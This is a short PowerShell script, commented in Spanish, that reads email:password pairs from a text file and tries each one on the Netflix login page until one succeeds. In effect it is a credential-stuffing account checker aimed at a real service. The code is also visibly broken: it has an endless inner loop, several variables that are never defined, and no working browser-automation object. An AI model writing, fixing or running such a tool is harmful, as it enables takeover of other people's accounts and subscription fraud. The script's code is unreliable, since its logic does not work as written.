# Abrir el ficherin
$cuentas = Get-Content "cuentas.txt"

# Bucle para probar las cuentas
for ($i = 0; $i -lt $cuentas.Count; $i++) {

    #Bucle para sacar las lineas de cada cuenta
    foreach ($i in $cuentas) {
        while ($i -lt $cuentas.Count){
            continue
        }
        $email = $linea.Split(":")[0]
        $password = $linea.Split(":")[1]
       }
    Write-Host $email $password

    # Abre la página web
    Start-Process "https://www.netflix.com/es/login"
    # Esperar a que cargue
    Start-Sleep 2

    # Ingresa el correo electrónico
    try {
    $emailField = $page.FindElementByXPath('//*[@id="id_userLoginId"]')
    $email = $emailArray.ElementAt(0)
    $emailField.SendKeys($email)
    } catch {
        Write-Warning "Email No funciona"
         Write-Host $email $password
    }

    # Ingresa la contraseña
    try {
    $passwordField = $page.FindElementByXPath('//*[@id="id_password"]')
    $password = $passwordArray.ElementAt(0)
    $passwordField.SendKeys($password)
    } catch {
        Write-Warning "Password no Funcion"
         Write-Host $email $password
    }

    # Hace clic en el botón "Iniciar sesión"
    try {
    $loginButtonField = $page.FindElementByXPath('//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')
    $loginButton = $loginButtonArray.ElementAt(0)
    $loginButtonField.Click()
    } catch {
        Write-Warning "El botón de inicio de sesión no se ha encontrado"
    }

    # Verifica si el inicio de sesión fue exitoso
    $isLoggedIn = (Get-Process "explorer" | Where-Object { $_.MainWindowTitle -eq "Netflix - Mi cuenta" }).MainWindowTitle
    if ($isLoggedIn) {
        # Inicio de sesión exitoso

        break
    }
}

# Si ninguna de las cuentas funcionó, muestra un error
if ($i -eq $cuentas.Count) {
    Write-Host "No se pudo iniciar sesión en ninguna de las cuentas"
}